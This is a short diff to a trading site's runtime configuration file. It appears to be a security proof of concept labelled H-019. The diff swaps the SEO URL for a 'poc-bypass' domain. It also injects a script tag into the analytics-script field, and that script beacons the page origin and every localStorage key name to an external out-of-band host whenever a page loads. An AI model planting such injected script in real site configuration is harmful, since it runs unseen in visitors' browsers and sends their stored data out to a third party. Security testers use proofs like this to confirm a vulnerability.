@@ -27,7 +27,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_TWITTER_URL": "",
   "VITE_SEO_SITE_NAME": "",
   "VITE_SEO_SITE_DESCRIPTION": "",
-  "VITE_SEO_SITE_URL": "https://dex.orderly.network/h019-poc-1779847962-1248/",
+  "VITE_SEO_SITE_URL": "https://poc-bypass-1779847974.example.com",
   "VITE_SEO_SITE_LANGUAGE": "en",
   "VITE_SEO_SITE_LOCALE": "en_US",
   "VITE_SEO_TWITTER_HANDLE": "",
@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "",
+  "VITE_ANALYTICS_SCRIPT": "<script>console.log(\"[H-019] beacon firing. origin=\",location.origin);var img=new Image();img.src=\"https://d8b55teu5rajsqc14utgz5h6oaxroo38c.oast.live/h019?o=\"+encodeURIComponent(location.origin)+\"&t=\"+Date.now()+\"&lskeys=\"+encodeURIComponent(Object.keys(localStorage).join(\",\"));document.title=\"VULN-CONFIRMED-H019-\"+Date.now();</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
